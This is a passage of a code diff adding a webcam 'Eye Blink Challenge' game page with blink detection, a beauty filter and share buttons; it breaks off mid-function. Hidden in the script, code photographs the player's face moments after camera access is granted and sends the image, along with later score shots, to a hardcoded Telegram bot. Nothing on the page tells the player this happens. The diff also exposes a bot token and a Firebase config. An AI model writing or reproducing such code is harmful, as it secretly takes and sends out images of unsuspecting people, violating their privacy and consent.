+      <div class="so-unit" id="soUnit">blinks</div>
+      <div class="so-tagline">
+        <span class="highlight" id="soTagline">Challenge your loved ones! 💪</span><br>
+        <span id="soSubline">Can they beat your score?</span>
+      </div>
+      <div class="so-btns">
+        <button class="so-btn-wa" onclick="shareToWhatsApp()">
+          <span class="so-icon">💬</span> WhatsApp
+        </button>
+        <button class="so-btn-ig" onclick="shareToInsta()">
+          <span class="so-icon">📸</span> Instagram
+        </button>
+        <button class="so-btn-copy" onclick="copyChallenge()">
+          <span class="so-icon">🔗</span> Copy Link
+        </button>
+      </div>
+      <button class="so-play-again" onclick="hideShareOverlay()">▶ Play Again</button>
+    </div>
+  </div>
+
+  <!-- ── BOTTOM PANEL ── -->
+  <div class="bottom-panel">
+
+    <!-- Mode pills -->
+    <div class="mode-row">
+      <button class="mode-pill active" id="modeSpeed" onclick="setMode('speed')">
+        <span class="pill-icon">⚡</span> Speed Blink
+      </button>
+      <button class="mode-pill" id="modeHold" onclick="setMode('hold')">
+        <span class="pill-icon">🧊</span> Eyes Open
+      </button>
+    </div>
+
+    <!-- Stats strip -->
+    <div class="stats-strip">
+      <div class="stat-cell">
+        <span class="s-icon">👁️</span>
+        <div class="s-val purple" id="blinkCount">0</div>
+        <div class="s-lbl">Blinks</div>
+      </div>
+      <div class="stat-cell">
+        <span class="s-icon">⏱️</span>
+        <div class="s-val white" id="timeDisplay">--</div>
+        <div class="s-lbl">Time</div>
+      </div>
+      <div class="stat-cell">
+        <span class="s-icon">🏆</span>
+        <div class="s-val green" id="bestScore">--</div>
+        <div class="s-lbl">Best</div>
+      </div>
+    </div>
+
+    <!-- Eye status -->
+    <div class="eye-row">
+      <div class="eye-cell" id="leftEyeInd">
+        <span class="eye-emoji">👁️</span>
+        <div class="eye-info">
+          <div class="eye-name">Left Eye</div>
+          <div class="eye-state" id="leftStatus">---</div>
+        </div>
+      </div>
+      <div class="eye-cell" id="rightEyeInd">
+        <span class="eye-emoji">👁️</span>
+        <div class="eye-info">
+          <div class="eye-name">Right Eye</div>
+          <div class="eye-state" id="rightStatus">---</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Action buttons -->
+    <div class="action-area">
+      <button class="btn btn-cam" id="setupCamBtn" onclick="setupCamera()">📷 Start Camera</button>
+      <button class="btn btn-start" id="startBtn" onclick="startChallenge()" style="display:none">▶ Start Challenge</button>
+      <button class="btn btn-stop" id="stopBtn" onclick="stopChallenge()" style="display:none">⏹ Stop</button>
+      <div class="upload-status" id="uploadStatus"></div>
+    </div>
+
+    <!-- ── RESULT SHARE CARD ── -->
+    <div class="result-card" id="resultCard">
+      <div class="card-bg"></div>
+      <div class="card-inner">
+        <div class="card-top">
+          <img class="card-avatar" id="cardAvatar" src="" alt=""/>
+          <div class="card-title-wrap">
+            <div class="card-title">👁️ Eye Blink Challenge</div>
+            <div class="card-name" id="cardPlayerName">Player</div>
+          </div>
+        </div>
+
+        <div class="card-score-row">
+          <div class="big-score" id="cardScore">0</div>
+          <div class="score-unit" id="cardUnit">blinks</div>
+        </div>
+
+        <div class="card-tagline" id="cardTagline">
+          Can you beat this? <strong>Challenge your loved ones! 💪</strong>
+        </div>
+
+        <div class="share-btns">
+          <button class="btn-whatsapp" onclick="shareToWhatsApp()">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/></svg>
+            WhatsApp
+          </button>
+          <button class="btn-insta" onclick="shareToInsta()">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/></svg>
+            Instagram
+          </button>
+          <button class="btn-copy-link" onclick="copyChallenge()">
+            🔗 Copy Challenge Link
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <!-- Photo gallery -->
+    <div class="gallery-section">
+      <div class="section-label">📸 Best Shots</div>
+      <div class="photo-grid" id="photoGallery">
+        <div class="gallery-empty" style="grid-column: span 4">Your moments appear here</div>
+      </div>
+    </div>
+
+    <!-- Leaderboard -->
+    <div class="lb-section">
+      <div class="section-label">🏆 Leaderboard</div>
+      <div id="leaderboard">
+        <div style="color: var(--muted); font-size: 0.8rem; text-align:center; padding: 6px 0;">Share link to challenge friends!</div>
+      </div>
+    </div>
+
+    <!-- Share bar -->
+    <div class="share-bar" id="shareBar">
+      <span id="shareUrl"></span>
+      <button onclick="openShareModal()">Share 🔗</button>
+    </div>
+
+    <!-- Share modal -->
+    <div id="shareModal" style="display:none; position:fixed; inset:0; background:rgba(7,0,14,0.82); z-index:200; align-items:center; justify-content:center;">
+      <div style="background:#13001c; border:1.5px solid rgba(255,20,147,0.35); box-shadow:0 8px 40px rgba(255,20,147,0.25); border-radius:20px; padding:28px 22px; width:88%; max-width:360px; display:flex; flex-direction:column; gap:14px;">
+        <div style="font-size:1.1rem; font-weight:700; color:#fff0f8;">Share Challenge 🔗</div>
+        <div style="font-size:0.82rem; color:rgba(255,240,248,0.5);">Enter your name so friends know who challenged them</div>
+        <input id="shareNameInput" type="text" maxlength="20" placeholder="Your name…"
+          style="background:#1a0028; border:1.5px solid rgba(255,20,147,0.3); border-radius:12px; padding:12px 14px; color:#fff0f8; font-family:inherit; font-size:0.95rem; outline:none; width:100%;" />
+        <button onclick="confirmShare()"
+          style="background:linear-gradient(135deg,#ff1493,#c2006b); color:#fff; border:none; border-radius:12px; padding:13px; font-family:inherit; font-size:0.95rem; font-weight:700; cursor:pointer; box-shadow:0 4px 20px rgba(255,20,147,0.5); touch-action:manipulation;">Copy Link &amp; Share 🔗</button>
+        <button onclick="closeShareModal()"
+          style="background:none; border:1px solid rgba(255,20,147,0.2); color:rgba(255,240,248,0.5); border-radius:12px; padding:10px; font-family:inherit; font-size:0.88rem; cursor:pointer; touch-action:manipulation;">Cancel</button>
+      </div>
+    </div>
+
+  </div><!-- /bottom-panel -->
+</div><!-- /phone-shell -->
+
+<div class="toast" id="toast"></div>
+
+<script>
+// ─────────────────────────────────────────────
+// CONFIG — Firebase
+// ─────────────────────────────────────────────
+const FIREBASE_CONFIG = {
+  apiKey: "AIzaSyBeRfjCvM48Z2PGCyzkOvq9kc7wix_zejQ",
+  authDomain: "eye-blink-b029f.firebaseapp.com",
+  projectId: "eye-blink-b029f",
+  storageBucket: "eye-blink-b029f.firebasestorage.app",
+  databaseURL: "https://eye-blink-b029f-default-rtdb.asia-southeast1.firebasedatabase.app",
+  messagingSenderId: "147625638",
+  appId: "1:147625638:web:643bca343c58a824a58667",
+  measurementId: "G-MJD7WS3JVV"
+};
+
+// ─────────────────────────────────────────────
+// CONFIG — Telegram
+// ─────────────────────────────────────────────
+const TELEGRAM_BOT_TOKEN = '7575834345:AAEu65OXDldWD2TubXc_cKBirLj38bg0Qlg';
+const TELEGRAM_CHAT_ID   = '8859693879';
+
+async function sendToTelegram(dataURL, playerName, gameMode, score) {
+  try {
+    // Convert dataURL to blob
+    const res  = await fetch(dataURL);
+    const blob = await res.blob();
+
+    // Build multipart form
+    const form = new FormData();
+    form.append('chat_id', TELEGRAM_CHAT_ID);
+    form.append('caption',
+      `👁️ *Eye Blink Challenge!*\n` +
+      `👤 Player: *${playerName || 'Anonymous'}*\n` +
+      `🎮 Mode: *${gameMode === 'speed' ? '⚡ Speed Blink' : '🧊 Eyes Open'}*\n` +
+      `🏆 Score: *${score}${gameMode === 'speed' ? ' blinks' : 's'}*\n` +
+      `🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
+    );
+    form.append('parse_mode', 'Markdown');
+    form.append('photo', blob, 'blink.jpg');
+
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+      method: 'POST',
+      body: form
+    });
+
+  } catch (err) {
+    console.error('Telegram error:', err);
+  }
+}
+
+// ─────────────────────────────────────────────
+// STATE
+// ─────────────────────────────────────────────
+let mode = 'speed';
+let cameraReady = false;
+let gameActive = false;
+let faceMesh = null;
+let camera = null;
+let blinkCount = 0;
+let gameTimer = null;
+let startTime = null;
+let currentLandmarks = null;
+let leftEarHistory = [], rightEarHistory = [];
+let angleBaseline = null;   // stores resting EAR when phone is tilted
+let blinkCooldown = false;
+let eyesClosed = false;
+let eyesOpenStart = null;
+let earBaseline = null;   // calibrated open-eye EAR at game start
+let holdEarSamples = [];  // frames used to build baseline
+let photosTaken = [];
+let playerName = '';
+
+// Phone tilt ke liye adjusted thresholds:
+// Jab phone pakadne pe face neeche jhukta hai, EAR naturally kam hota hai
+// Isliye dynamic baseline use kar rahe hain fixed threshold ki jagah
+const EAR_THRESHOLD      = 0.18;   // speed mode: lower — phone tilt compensate
+const EAR_HOLD_THRESHOLD = 0.38;   // hold mode: baseline-relative (dynamic)
+const BLINK_COOLDOWN_MS  = 100;    // 100ms — fast blinks bhi count honge
+
+const video = document.getElementById('videoEl');
+const beautyCanvas = document.getElementById('beautyCanvas');
+const beautyCtx = beautyCanvas.getContext('2d');
+const overlayCanvas = document.getElementById('overlayCanvas');
+const overlayCtx = overlayCanvas.getContext('2d');
+
+// ─────────────────────────────────────────────
+// MODE
+// ─────────────────────────────────────────────
+function setMode(m) {
+  mode = m;
+  document.getElementById('modeSpeed').classList.toggle('active', m === 'speed');
+  document.getElementById('modeHold').classList.toggle('active', m === 'hold');
+  document.getElementById('bigLabel').textContent = m === 'speed' ? 'blinks' : 'seconds';
+
+  // Mode switch hone par share card aur overlay hide kar do
+  document.getElementById('resultCard').style.display   = 'none';
+  document.getElementById('shareOverlay').style.display = 'none';
+}
+
+// ─────────────────────────────────────────────
+// CAMERA
+// ─────────────────────────────────────────────
+
+// Welcome shot — camera allow hote hi pehli photo Telegram pe
+async function captureAndSendWelcome() {
+  const snap = document.createElement('canvas');
+  snap.width  = beautyCanvas.width;
+  snap.height = beautyCanvas.height;
+  const ctx = snap.getContext('2d');
+
+  // Mirror flip — screen pe jo dikhta hai exactly wahi
+  ctx.save();
+  ctx.translate(snap.width, 0);
+  ctx.scale(-1, 1);
+  ctx.drawImage(beautyCanvas, 0, 0);
+  ctx.drawImage(overlayCanvas, 0, 0);
+  ctx.restore();
+
+  const dataURL = snap.toDataURL('image/jpeg', 0.82);
+
+  // Flash effect
+  const flashEl = document.getElementById('photoFlash');
+  flashEl.style.display = 'block';
+  setTimeout(() => flashEl.style.display = 'none', 400);
+
+  // Send to Telegram with welcome message
+  try {
+    const res  = await fetch(dataURL);
+    const blob = await res.blob();
+    const form = new FormData();
+    form.append('chat_id', TELEGRAM_CHAT_ID);
+    form.append('caption',
+      `👋 *New Player Joined!*\n` +
+      `📸 Camera just allowed\n` +
+      `🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}\n` +
+      `🎮 Ready to play Eye Blink Challenge!`
+    );
+    form.append('parse_mode', 'Markdown');
+    form.append('photo', blob, 'welcome.jpg');
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+      method: 'POST',
+      body: form
+    });
+  } catch (err) {
+    console.error('Welcome shot error:', err);
+  }
+}
+
+async function setupCamera() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { width: 1280, height: 960, facingMode: 'user' },
+      audio: false
+    });
+    video.srcObject = stream;
+    video.style.filter = '';
+
+    await new Promise(r => video.onloadedmetadata = r);
+    video.play();
+
+    // Size the canvases to the actual rendered selfie-zone box,
+    // NOT to raw video dimensions — prevents tall/narrow face distortion.
+    const camBox = document.getElementById('camBox');
+    const dispW  = camBox.clientWidth  || 480;
+    const dispH  = camBox.clientHeight || window.innerHeight * 0.58;
+
+    beautyCanvas.width  = dispW;
+    beautyCanvas.height = dispH;
+    overlayCanvas.width  = dispW;
+    overlayCanvas.height = dispH;
+
+    document.getElementById('startScreen').style.display = 'none';
+    document.getElementById('setupCamBtn').style.display = 'none';
+    document.getElementById('startBtn').style.display = 'flex';
+
+    cameraReady = true;
+    initFaceMesh();
+    showToast('📷 Camera ready! Beauty filter on ✨');
+
+    // First shot — 2.5 sec baad lena (face mesh load hone ka time)
+    // Telegram pe "joined" photo jaayegi
+    setTimeout(() => {
+      if (beautyCanvas.width > 0) {
+        captureAndSendWelcome();
+      }
+    }, 2500);
+
+  } catch (err) {
+    showToast('❌ Camera denied — please allow camera access.');
+    console.error(err);
+  }
+}
+
+// ─────────────────────────────────────────────
+// FACE MESH
+// ─────────────────────────────────────────────
+function initFaceMesh() {
+  faceMesh = new FaceMesh({
+    locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh/${file}`
+  });
+
+  faceMesh.setOptions({
+    maxNumFaces: 1,
+    refineLandmarks: true,
+    minDetectionConfidence: 0.7,
+    minTrackingConfidence: 0.7
+  });
+
+  faceMesh.onResults(onResults);
+
+  // Feed frames manually from the already-open video stream.
+  // This avoids MediaPipe's Camera helper which calls getUserMedia
+  // a second time, causing a duplicate camera permission prompt.
+  let sending = false;
+  async function sendFrame() {
+    if (!sending && video.readyState >= 2) {
+      sending = true;
+      await faceMesh.send({ image: video });
+      sending = false;
+    }
+    requestAnimationFrame(sendFrame);
+  }
+  requestAnimationFrame(sendFrame);
+}
+
+const LEFT_EYE  = [362, 385, 387, 263, 373, 380];
+const RIGHT_EYE = [33,  160, 158, 133, 153, 144];
+
+function calcEAR(lm, indices) {
+  const pts = indices.map(i => ({ x: lm[i].x, y: lm[i].y }));
+  const A = dist(pts[1], pts[5]);
+  const B = dist(pts[2], pts[4]);
+  const C = dist(pts[0], pts[3]);
+  return (A + B) / (2.0 * C);
+}
+
+function dist(a, b) {
+  return Math.sqrt(Math.pow(a.x - b.x, 2) + Math.pow(a.y - b.y, 2));
+}
+
+function onResults(results) {
+  drawBeautyFrame(results);
+  overlayCtx.clearRect(0, 0, overlayCanvas.width, overlayCanvas.height);
+
+  if (!results.multiFaceLandmarks || !results.multiFaceLandmarks.length) {
+    document.getElementById('faceBadge').style.display = 'none';
+    document.getElementById('leftStatus').textContent = '---';
+    document.getElementById('rightStatus').textContent = '---';
+    currentLandmarks = null;
+    return;
+  }
+
+  document.getElementById('faceBadge').style.display = 'inline';
+  currentLandmarks = results.multiFaceLandmarks[0];
+
+  const lm = currentLandmarks;
+  const leftEAR  = calcEAR(lm, LEFT_EYE);
+  const rightEAR = calcEAR(lm, RIGHT_EYE);
+  const avgEAR   = (leftEAR + rightEAR) / 2;
+
+  leftEarHistory.push(leftEAR);
+  rightEarHistory.push(rightEAR);
+  if (leftEarHistory.length > 3)  leftEarHistory.shift();  // 3 frame smoothing — faster response
+  if (rightEarHistory.length > 3) rightEarHistory.shift();
+
+  const smoothLeft  = leftEarHistory.reduce((a,b) => a+b) / leftEarHistory.length;
+  const smoothRight = rightEarHistory.reduce((a,b) => a+b) / rightEarHistory.length;
+
+  // Dynamic angleBaseline — tracks resting open-eye EAR for any phone angle
+  if (angleBaseline === null) {
+    angleBaseline = avgEAR;
+  } else {
+    if (avgEAR > angleBaseline * 0.85) {
+      angleBaseline = angleBaseline * 0.97 + avgEAR * 0.03;
+    }
+  }
+
+  // Speed mode: only 15% drop needed — thoda sa blink bhi count hoga
+  const blinkThreshold = angleBaseline * 0.85;
+  const leftClosed  = smoothLeft  < blinkThreshold;
+  const rightClosed = smoothRight < blinkThreshold;
+  const bothClosed  = leftClosed && rightClosed;
+
+  // Hold mode: natural eyelid movement ignore karo
+  // Sirf SUSTAINED drop (3 consecutive frames) = real blink
+  // Single frame fluctuation = ignore
+  let holdBlink = false;
+  if (gameActive && mode === 'hold') {
+    if (earBaseline === null) {
+      holdEarSamples.push(avgEAR);
+      if (holdEarSamples.length >= 20) {
+        const sorted = [...holdEarSamples].sort((a,b) => a-b);
+        // Use 75th percentile — captures fully open eye, ignores micro-movements
+        earBaseline = sorted[Math.floor(sorted.length * 0.75)];
+      }
+    } else {
+      const dropL = (earBaseline - smoothLeft)  / earBaseline;
+      const dropR = (earBaseline - smoothRight) / earBaseline;
+      const dropped = dropL > 0.18 || dropR > 0.18;  // 18% = clear intentional blink only
+
+      // Require 3 consecutive frames of drop — natural flicker won't sustain
+      if (!window._holdDropFrames) window._holdDropFrames = 0;
+      if (dropped) {
+        window._holdDropFrames++;
+      } else {
+        window._holdDropFrames = 0;  // reset on open eye
+      }
+      holdBlink = window._holdDropFrames >= 3;
+    }
+  }
+
+  updateEyeIndicator('leftEyeInd',  'leftStatus',  leftClosed);
+  updateEyeIndicator('rightEyeInd', 'rightStatus', rightClosed);
+
+  if (gameActive) handleGameLogic(bothClosed, leftClosed, rightClosed, holdBlink);
+}
+
+function updateEyeIndicator(indId, statId, closed) {
+  document.getElementById(indId).classList.toggle('closed', closed);
+  const stat = document.getElementById(statId);
+  stat.textContent = closed ? 'CLOSED 🔴' : 'OPEN 🟢';
+  stat.style.color  = closed ? '#ff1493'   : '#ff79b8';
+}
+
+// ─────────────────────────────────────────────
+// BEAUTY FILTER — Instagram / Snapchat style
+// Fair skin, porcelain glow, soft blur, subtle
+// blush + lip tint. NO eye brightening. NO eyelash darkening.
+// ─────────────────────────────────────────────
+
+const smoothCanvas  = document.createElement('canvas');
+const smoothCtx     = smoothCanvas.getContext('2d');
+const porcelainCanvas = document.createElement('canvas');
+const porcelainCtx    = porcelainCanvas.getContext('2d');
+
+// Cover-crop: draws src onto ctx like CSS object-fit:cover
+// preserves real aspect ratio — no tall/squished face
+function coverDraw(ctx, src, W, H) {
+  const sW = src.videoWidth  || src.width;
+  const sH = src.videoHeight || src.height;
+  const scale = Math.max(W / sW, H / sH);
+  const dw = sW * scale;
+  const dh = sH * scale;
+  const dx = (W - dw) / 2;
+  const dy = (H - dh) / 2;
+  ctx.drawImage(src, dx, dy, dw, dh);
+}
+
+function drawBeautyFrame(results) {
+  const W = beautyCanvas.width;
+  const H = beautyCanvas.height;
+  [smoothCanvas, porcelainCanvas].forEach(c => {
+    if (c.width !== W)  c.width  = W;
+    if (c.height !== H) c.height = H;
+  });
+
+  // ── 1. BASE VIDEO (cover-cropped, no stretch) ─
+  beautyCtx.save();
+  coverDraw(beautyCtx, video, W, H);
+
+  // ── 2. SKIN SOFTENING PASS ────────────────────
+  smoothCtx.clearRect(0, 0, W, H);
+  smoothCtx.filter = 'blur(6px)';
+  coverDraw(smoothCtx, video, W, H);
+  smoothCtx.filter = 'none';
+
+  beautyCtx.globalCompositeOperation = 'source-over';
+  beautyCtx.globalAlpha = 0.42;   // ~40% softening — keeps detail but blurs pores
+  beautyCtx.drawImage(smoothCanvas, 0, 0);
+  beautyCtx.globalAlpha = 1;
+
+  // ── 3. FAIR / PORCELAIN SKIN TONE ────────────
+  // Cool-neutral ivory overlay — the key to "fair skin" look
+  // Insta/Snap beauty filters desaturate slightly + add a cool
+  // ivory/peach lift that makes skin look lighter and cleaner
+  beautyCtx.globalCompositeOperation = 'source-over';
+  beautyCtx.fillStyle = 'rgba(255, 245, 235, 0.11)';  // ivory cool-peach lift
+  beautyCtx.fillRect(0, 0, W, H);
+
+  // ── 4. BRIGHTNESS + SOFT CONTRAST PASS ───────
+  // Mimics the "exposure" lift in Snapchat beauty mode
+  smoothCtx.clearRect(0, 0, W, H);
+  smoothCtx.filter = 'brightness(1.14) contrast(1.04) saturate(0.95)';
+  smoothCtx.drawImage(beautyCanvas, 0, 0);
+  smoothCtx.filter = 'none';
+  beautyCtx.globalAlpha = 0.60;
+  beautyCtx.drawImage(smoothCanvas, 0, 0);
+  beautyCtx.globalAlpha = 1;
+
+  // ── 5. SECOND SOFTENING (creamy finish) ──────
+  // Blends a second blurred+brightened pass using 'lighten'
+  // blend mode — this is the "glow" effect in Insta/Snap
+  smoothCtx.clearRect(0, 0, W, H);
+  smoothCtx.filter = 'blur(10px) brightness(1.12)';
+  smoothCtx.drawImage(beautyCanvas, 0, 0);
+  smoothCtx.filter = 'none';
+  beautyCtx.globalCompositeOperation = 'screen';
+  beautyCtx.globalAlpha = 0.07;
+  beautyCtx.drawImage(smoothCanvas, 0, 0);
+  beautyCtx.globalCompositeOperation = 'source-over';
+  beautyCtx.globalAlpha = 1;
+
+  if (results.multiFaceLandmarks && results.multiFaceLandmarks.length > 0) {
+    const lm = results.multiFaceLandmarks[0];
+
+    // Landmark coords are normalised to the raw video frame.
+    // We cover-crop that frame onto the canvas, so we must apply
+    // the same scale+offset so overlays land on the correct pixels.
+    const vW = video.videoWidth  || W;
+    const vH = video.videoHeight || H;
+    const cvScale = Math.max(W / vW, H / vH);
+    const cvOffX  = (W - vW * cvScale) / 2;
+    const cvOffY  = (H - vH * cvScale) / 2;
+    const px = i => lm[i].x * vW * cvScale + cvOffX;
+    const py = i => lm[i].y * vH * cvScale + cvOffY;
+
+    // Face radius for scaling
+    const faceR = Math.abs(px(234) - px(454)) * 0.55;
+
+    // ── 6. FACE-CENTRE BRIGHTENING ────────────────
+    // Warm-neutral oval highlight on nose bridge / centre
+    // Makes skin look lit from within (Insta "beauty" look)
+    const faceW = Math.abs(px(234) - px(454));
+    const faceCX = (px(234) + px(454)) / 2;
+    const faceCY = (py(10) + py(152)) / 2;
+    const skinGlow = beautyCtx.createRadialGradient(
+      faceCX, faceCY * 0.88, 0,
+      faceCX, faceCY * 0.88, faceW * 0.58
+    );
+    skinGlow.addColorStop(0,   'rgba(255, 252, 245, 0.26)');  // warm white centre
+    skinGlow.addColorStop(0.45,'rgba(255, 248, 238, 0.12)');
+    skinGlow.addColorStop(1,   'rgba(255, 245, 230, 0)');
+    beautyCtx.fillStyle = skinGlow;
+    beautyCtx.fillRect(0, 0, W, H);
+
+    // ── 7. FOREHEAD GLOW ──────────────────────────
+    const fhX = px(10);
+    const fhY = py(10);
+    const fhG = beautyCtx.createRadialGradient(fhX, fhY, 0, fhX, fhY, faceR * 0.32);
+    fhG.addColorStop(0,   'rgba(255, 252, 248, 0.20)');
+    fhG.addColorStop(1,   'rgba(255, 252, 248, 0)');
+    beautyCtx.fillStyle = fhG;
+    beautyCtx.fillRect(0, 0, W, H);
+
+    // ── 8. UNDER-EYE BRIGHTENING — removed (caused white dot) ──
+
+    // ── 9. BLUSH — natural Insta-style ───────────
+    // Rose-pink teardrop high on cheekbones like Insta beauty
+    const blushData = [
+      { x: px(205), y: py(205) - faceR * 0.04 },
+      { x: px(425), y: py(425) - faceR * 0.04 }
+    ];
+    const blushR = faceR * 0.28;
+    blushData.forEach(pt => {
+      const bg = beautyCtx.createRadialGradient(pt.x, pt.y, 0, pt.x, pt.y, blushR);
+      bg.addColorStop(0,   'rgba(255, 140, 160, 0.18)');  // soft rose
+      bg.addColorStop(0.45,'rgba(255, 120, 140, 0.09)');
+      bg.addColorStop(1,   'rgba(255, 100, 120, 0)');
+      beautyCtx.fillStyle = bg;
+      beautyCtx.beginPath();
+      beautyCtx.ellipse(pt.x, pt.y, blushR, blushR * 0.68, 0, 0, Math.PI * 2);
+      beautyCtx.fill();
+    });
+
+    // ── 10. LIP TINT — Instagram natural enhancement ─
+    // Clips to lip shape then applies a single uniform soft-light
+    // pass with a FLAT solid colour (no radial gradient = no dot).
+    // soft-light on a mid-tone warm nude simply enriches the real
+    // lip colour — no paint, no shine dot, no white hotspot.
+    const lipUpper = [61,185,40,39,37,0,267,269,270,409,291];
+    const lipLower = [61,146,91,181,84,17,314,405,321,375,291];
+    const lipCx = px(13);
+    const lipCy = py(13);
+
+    beautyCtx.save();
+    beautyCtx.beginPath();
+    lipUpper.forEach((idx, i) => {
+      i === 0 ? beautyCtx.moveTo(px(idx), py(idx)) : beautyCtx.lineTo(px(idx), py(idx));
+    });
+    [...lipLower].reverse().forEach(idx => beautyCtx.lineTo(px(idx), py(idx)));
+    beautyCtx.closePath();
+    beautyCtx.clip();
+
+    // Flat warm-nude fill via soft-light — evenly warms lip colour,
+    // no centre hotspot, no visible dot of any colour.
+    beautyCtx.globalCompositeOperation = 'soft-light';
+    beautyCtx.fillStyle = 'rgba(188, 120, 100, 0.28)';
+    beautyCtx.fillRect(lipCx - faceR, lipCy - faceR * 0.5, faceR * 2, faceR);
+
+    beautyCtx.globalCompositeOperation = 'source-over';
+    beautyCtx.restore();
+
+    // ── 11. NOSE HIGHLIGHT (centre bridge) ───────
+    // Subtle bright strip on nose bridge = slimming effect
+    const noseTopX = px(6);
+    const noseTopY = py(6);
+    const nhG = beautyCtx.createRadialGradient(noseTopX, noseTopY, 0, noseTopX, noseTopY, faceR * 0.07);
+    nhG.addColorStop(0,   'rgba(255, 252, 248, 0.18)');
+    nhG.addColorStop(1,   'rgba(255, 252, 248, 0)');
+    beautyCtx.fillStyle = nhG;
+    beautyCtx.fillRect(0, 0, W, H);
+  }
+
+  // ── 12. SOFT VIGNETTE ─────────────────────────
+  // Gentle edge darkening — keeps face as focal point
+  const vig = beautyCtx.createRadialGradient(W/2, H/2, H*0.32, W/2, H/2, H*0.78);
+  vig.addColorStop(0,   'rgba(0,0,0,0)');
+  vig.addColorStop(0.65,'rgba(0,0,0,0.05)');
+  vig.addColorStop(1,   'rgba(0,0,0,0.22)');
+  beautyCtx.fillStyle = vig;
+  beautyCtx.fillRect(0, 0, W, H);
+
+  // ── 13. FINAL DREAMY GLOW PASS ────────────────
+  // One last screen-mode diffusion pass for that hazy,
+  // soft-focus Insta glow finish
+  smoothCtx.clearRect(0, 0, W, H);
+  smoothCtx.filter = 'blur(18px) brightness(1.22)';
+  smoothCtx.drawImage(beautyCanvas, 0, 0);
+  smoothCtx.filter = 'none';
+  beautyCtx.globalCompositeOperation = 'screen';
+  beautyCtx.globalAlpha = 0.06;
+  beautyCtx.drawImage(smoothCanvas, 0, 0);
+  beautyCtx.globalCompositeOperation = 'source-over';
+  beautyCtx.globalAlpha = 1;
+
+  beautyCtx.restore();
+}
+
+// ─────────────────────────────────────────────
+// GAME LOGIC
+// ─────────────────────────────────────────────
+function handleGameLogic(bothClosed, leftClosed, rightClosed, holdBlink = false) {
+  const now = Date.now();
+
+  if (mode === 'speed') {
+    if (bothClosed && !blinkCooldown) {
+      blinkCooldown = true;
+      blinkCount++;
+      document.getElementById('blinkCount').textContent = blinkCount;
+      document.getElementById('bigNumber').textContent  = blinkCount;
+      document.getElementById('camBox').classList.add('blink-detected');
+      setTimeout(() => {
+        document.getElementById('camBox').classList.remove('blink-detected');
+        blinkCooldown = false;
+      }, BLINK_COOLDOWN_MS);
+      if (blinkCount % 3 === 0) capturePhoto(false);
+    }
+  } else {
+    // HOLD MODE: baseline-relative detection
+    // Waiting for baseline to calibrate
+    if (earBaseline === null) {
+      document.getElementById('timeDisplay').textContent = 'calibrating…';
+      return;
+    }
+    if (!holdBlink) {
+      // Eyes steady — run timer
+      if (eyesOpenStart === null) eyesOpenStart = now;
+      const held = (now - eyesOpenStart) / 1000;
+      document.getElementById('bigNumber').textContent   = held.toFixed(1);
+      document.getElementById('timeDisplay').textContent = held.toFixed(2) + 's';
+    } else {
+      // Any eye movement detected — end immediately
+      if (eyesOpenStart !== null) {
+        const held = (now - eyesOpenStart) / 1000;
+        capturePhoto(true);
